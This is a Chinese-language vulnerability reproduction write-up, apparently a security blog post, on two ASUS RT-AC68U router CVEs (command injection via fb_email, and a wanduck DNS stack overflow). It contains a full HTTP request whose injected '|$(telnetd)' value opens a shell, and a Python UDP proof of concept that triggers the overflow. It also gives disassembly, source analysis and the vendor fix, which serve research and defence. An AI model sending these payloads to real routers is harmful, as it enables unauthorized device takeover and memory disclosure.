# 华硕RT-AC68U系列漏洞复现（二）
> buggart
> 来源：https://www.iotsec-zone.com/article/53

# 华硕RT-AC68U漏洞复现（二）：384-45708 ——hvidwp

# 漏洞复现第二站：384-45708                           

```
版本 3.0.0.4.384.45708                

2019/03/29                39.76 MBytes

ASUS RT-AC68U 固件版本3.0.0.4.384.45708 
安全性修正
- 修正 CVE-2018-20334
- 修正 CVE-2018-20336
- 修正 null pointer 问题. 感谢 CodeBreaker of STARLabs
- 修正 AiCloud 缓冲区溢位漏洞 感谢Resecurity International

问题修正
- 修正路由器使用 IPv6 WAN 时的 AiMesh LAN IP 问题
- 修正AiMesh 连线问题
- 修正网路地图相关问题
- 修正Download Master 图示消失问题
- 修正当启用Samba 服务时LAN PC 无法在网路芳邻找到路由器之问题
- 修正LAN LED 灯号不显示问题

请先将档案解压缩後再用原始固件档案进行MD5确认

MD5: ce1dc4c44b042a452ff368c20ae0dc53

```

CVE官网：

```
CVE-ID:CVE-2018-20334
Description:An issue was discovered in ASUSWRT 3.0.0.4.384.20308. When processing  the /start_apply.htm POST data, there is a command injection issue via  shell metacharacters in the fb_email parameter. By using this issue, an  attacker can control the router and get shell.

```

处理/start_apply.htm post数据时，fb_email参数中的shell元字符有一个命令注入问题。 通过使用此问题，攻击者可以控制路由器并获取shell。 

```
CVE-ID:CVE-2018-20336
Description:An issue was discovered in ASUSWRT 3.0.0.4.384.20308. There is a  stack-based buffer overflow issue in parse_req_queries function in  wanduck.c via a long string over UDP, which may lead to an information  leak.

```

wanduck.c文件的‘parse_req_queries’函数存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。                                                     

## CVE-2018-20334

访问/start_apply.htm，在处理POST数据时，存在命令注入问题，fb_email参数中的shell可以注入。

通过一下post包可以在受影响的路由器上启动telnetd:

```
POST /start_apply.htm HTTP/1.1
Host: 192.168.1.1
Content-Length: 557
Cache-Control: max-age=0
Origin: http://192.168.50.1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Referer: http://192.168.1.1/Advanced_Feedback.asp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: asus_token=jrPgm5H7TNyhlpOT2CUonTvPLBX3zVc; clickedItem_tab=6
Connection: close

preferred_lang=CN&current_page=Advanced_Feedback.asp&action_mode=apply&action_script=restart_sendmail&action_wait=60&PM_attach_syslog=0&PM_attach_cfgfile=0&PM_attach_iptables=&PM_attach_modemlog=0&PM_attach_wlanlog=0&feedbackresponse=&fb_experience=&fb_browserInfo=Mozilla%2F5.0+%28Windows+NT+10.0%3B+WOW64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F64.0.3282.186+Safari%2F537.36&fb_transid=E7B1B39C7A501054&fb_country=eee&fb_email=test%40test.com|$(telnetd)&dblog_enable=0&fb_ptype=No_selected&fb_pdesc=others&fb_comment=trwetwe3r&msglength=1991
```

在http的处理流程中，会在except_mime_handlers列表中进行匹配，其中包含了一些访问的cgi和asp，对应有设置flag。

```
    for ( exhandler = except_mime_handlers; exhandler->pattern; ++exhandler )
    {
      if ( match_url(exhandler->pattern, url) )
      {
        mime_exception = exhandler->flag;       // 如果和except_mime中的匹配上了，则设置flag
        goto LABEL_113;
      }
    }
```

start_apply.htm也包含在这个列表中。

```
.data:0004D804 except_mime_handlers except_mime_handler <aStartApplyHtm, 1>; 0
.data:0004D804                                         ; DATA XREF: handle_request:loc_DC20↑o
.data:0004D804                                         ; handle_request:loc_DC40↑r ...
.data:0004D804                 except_mime_handler <aStartApply2Htm, 1>; 1 ; "applyapp.cgi" ...
.data:0004D804                 except_mime_handler <aApiAsp, 1>; 2
   ......

.data:0004D804 ; .data         ends
```

之后在对应mime_handlers中寻找对应的handler。

```
    for ( handler = mime_handlers; ; ++handler )
    {
      if ( !handler->pattern )
        goto LABEL_223;
      if ( match_url(handler->pattern, url) )
        break;
    }
```

````
.data:0004CFB0 mime_handlers   mime_handler <aMainLoginAsp, aTextHtml, aCacheControlNo_0, \
.data:0004CFB0                                         ; DATA XREF: handle_request:loc_DC80↑o
.data:0004CFB0                                         ; handle_request:off_E354↑o ...
.data:0004CFB0                               do_html_post_an_get, do_ej, 0>; 0 ; "text/html" ...
.data:0004CFB0                 mime_handler <aNologinAsp, aTextHtml, aCacheControlNo_0, \
.data:0004CFB0                               do_html_post_an_get, do_ej, 0>; 1
......
aCacheControlNo_0, \
.data:0004CFB0                               do_html_post_an_get, do_ej, 0>; 26
.data:0004CFB0                 mime_handler <aXml, aTextXml, aCacheControlNo_0, do_html_post_an_get, \
.data:0004CFB0                               do_ej, do_auth>; 27
.data:0004CFB0                 mime_handler <aHtm, aTextHtml, aCacheControlNo_0, do_html_post_an_get,\
.data:0004CFB0                               do_ej, do_auth>; 28
````

之后.htm的output函数匹配到do_ej，在该函数中调用Advanced_Feedback.asp。

````
			} else if (postproc == 2) {			// execute asp
				p =   (asp + strlen (asp_mark1), asp_end, stream);
				if (p != NULL)  {
					asp = strstr (p, asp_mark1);
				}
````

在解开的固件文件系统中使用grep -r 搜索 "fb_email"字符串。

```
root@ubuntu:/home/.../squashfs-root# grep -r "fb_email"
Binary file usr/lib/libshared.so matches
www/Advanced_Feedback.asp:document.form.fb_email.disabled = "true";
www/Advanced_Feedback.asp:document.form.fb_email.disabled = "";
www/Advanced_Feedback.asp:if(document.form.fb_email.value == ""){
www/Advanced_Feedback.asp:document.form.fb_email.focus();
www/Advanced_Feedback.asp:if(!isEmail(document.form.fb_email.value)){
www/Advanced_Feedback.asp:document.form.fb_email.focus();
www/Advanced_Feedback.asp:<input type="text" name="fb_email" maxlength="50" class="input_25_table" value="" autocorrect="off" autocapitalize="off">
Binary file sbin/rc matches
```

发包之后，telnet上设备，nvram get "fb_email"可以看到fb_email的值。

```
admin@(none):/# nvram show | grep "fb_email"                                           
size: 55431 bytes (10105 left)                                                         
fb_email_dbg=                                                                         
fb_email=test@test.com|$(telnetd)                                                     
fb_email_provider=        
```

可以看到，此时环境变量中fb_email的值已经改变，设备中rc会启一个监听程序进行进一步处理。

在rc中会将productid，fb_email,log_path,fb_email_dbg等拼接命令交给system执行，从而实现命令注入。

```
  productid = (const char *)get_productid(v7);  fb_email_1 = nvram_safe_get((int)"fb_email");  if ( sub_8F5D8("fb_email_dbg", &byte_C4F21) )    fb_email_dbg = (char *)&unk_E55DC;  else    fb_email_dbg = nvram_safe_get((int)"fb_email_dbg");  sprintf(    s,    "cat %s | /usr/sbin/email -c %s -s \"%s feedback from %s\" %s %s",    "/tmp/xdslissuestracking",    "/tmp/var/tmp/data",    productid,    fb_email_1,    log_path,    fb_email_dbg);  system(s);
```

在新的固件中，通过正则表达式严格过滤fb_email为邮箱格式，从而修复该漏洞。

````
fb_email_value = safe_get_cgi_json( (int) "fb_email", v33, v5 ); ... ... v18 = regcomp( &preg, "^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*.\\w+([-.]\\w+)*$", 1 );  if ( v18 )
{
	dbg( "%s: Failed to compile the regular expression:%d\n", "validate_email_address", v18 );
}  else{ v19 = regexec( &preg, fb_email_value, 0, 0, 0 );    if ( v19 == 1 )
	 {
		 dbg( "No Match\n" );
	 }    else if ( !v19 )
	 {
		 v18 = 1;      dbg( "Match\n" );
	 }
````

## CVE-2018-20336

在wanduck.c文件的‘parse_req_queries’函数存在缓冲区错误漏洞。

验真poc

```python
from socket import *
HOST = '192.168.50.1'  
PORT = 18018
BUFSIZE = 4096
ADDR = (HOST, PORT)  
udpCliSock = socket(AF_INET, SOCK_DGRAM)   
data = "A"*2046+"\x00F"udpCliSock.sendto(data,ADDR)  
data,ADDR = udpCliSock.recvfrom(BUFSIZE)  
if data:	
    print len(data)  
udpCliSock.close()
```

Wanduck是一个侦听TCP 18017和UDP 18018的程序。端口18017可能是HTTP服务器，而18018很可能是DNS服务器。18017端口的HTTP服务器将HTTP请求重定向到80端口。DNS服务器将处理DNS请求包。

该文件wanduck.c在ASUSWRT源码的src/rc目录下可以找到。主程序的入口是函数wanduck_main，run_dns_serv函数是从18018端口接收数据包的入口。

源码为:

```c++
void run_dns_serv( int sockfd )
{
	int			n; char line[MAXLINE];
	struct sockaddr_in	cliaddr;
	int			clilen = sizeof(cliaddr);
	memset( line, 0, MAXLINE );
	memset( &cliaddr, 0, clilen );
	if ( (n = recvfrom( sockfd, line, MAXLINE, 0, (struct sockaddr *) &cliaddr, (socklen_t *) &clilen ) ) == 0 ) /* client close */
		return;
	else if ( n < 0 )
	{
		perror( "wanduck serv dns" );
		return;
	}else handle_dns_req( sockfd, line, n, (struct sockaddr *) &cliaddr, clilen );
}
```

MAXLINE在wanduck.h中定义值为2048，因此该函数首先从发送方接受2048字节的最大缓冲区，然后调用handle_dns_req处理dns请求包，在handle_dns_req函数的开头定义了变量reply_content，如下所示：

````c++
void handle_dns_req( int sfd, char *line, int maxlen, struct sockaddr *pcliaddr, int clen )
{
	dns_query_packet d_req; dns_response_packet d_reply; int reply_size; char reply_content[MAXLINE];
}
````

在这里reply_content被设计为最大大小为2048字节，在handle_dns_req中初始化进程后，dns请求包将传递给parse_req_queries函数，该函数接受4个参数。

```
    char *content, 代表回复（DNS响应）内容    
    char *lp, 代表 DNS 问题部分    
    int len, 代表 DNS Question 部分的长度（最多 2048-len(dns request header)）        int *reply_size, 指向回复包大小的指针
```

源码为:

```c++
void parse_req_queries( char *content, char *lp, int len, int *reply_size )
{
	int i, rn; rn = *(reply_size); for ( i = 0; i < len; ++i )
	{
		content[rn + i] = lp[i];  if ( lp[i] == 0 )
		{
			++i;   break;
		}
	}
	if ( i >= len )
		return;
	content[rn + i] = lp[i]; content[rn + i + 1] = lp[i + 1]; content[rn + i + 2] = lp[i + 2]; content[rn + i + 3] = lp[i + 3]; i += 4; *reply_size += i;
}
```

很明显，函数中存在栈溢出：假设***lp***缓冲区倒数第二个存在NULL(\x00) ，那么***for***循环结束，***i***加1。有判断检查***i***是否大于***len***，但这个检查是不够的。假设***i***等于***len-1***，则将执行以下代码：

````c++
content[rn+i] = lp[i];content[rn+i+1] = lp[i+1];content[rn+i+2] = lp[i+2];content[rn+i+3] = lp[i+3];i += 4;*reply_size += i;
````

正如我们所说，***rn***指向回复包大小和这个值，在这种情况下，传递给这个函数的***rn***是 DNS 请求头的长度。然后，

````c++
rn+i == rn+len-1rn+i+1==rn+lenrn+i+2==rn+len+1rn+i+3==rn+len+2i+4==len-1+4==len+3reply_size= len(dns_header)+len-1+4
````

所以这会引起Out of bound write问题，而且，这也会造成信息泄漏，因为reply_size大于0x800(2048)字节。

创作不易，师傅们，点个赞再走吧！
